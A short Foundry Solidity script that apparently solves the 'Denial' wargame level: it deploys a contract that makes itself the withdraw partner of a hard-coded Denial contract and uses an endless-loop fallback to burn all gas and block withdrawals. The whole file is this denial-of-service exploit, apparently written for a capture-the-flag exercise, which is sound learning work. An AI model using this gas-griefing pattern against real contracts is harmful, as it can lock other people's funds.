// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "../src/Denial.sol";
import {Script, console} from "forge-std/Script.sol";

contract DenialAttack is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        attack.setPartner();
        vm.stopBroadcast();
    }
}

contract Attack {
    Denial denial = Denial(payable(0x1C02350DDfE67215fA54A890CC5D95A981a30524));

    function setPartner() public {
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while (true) {}
    }
}
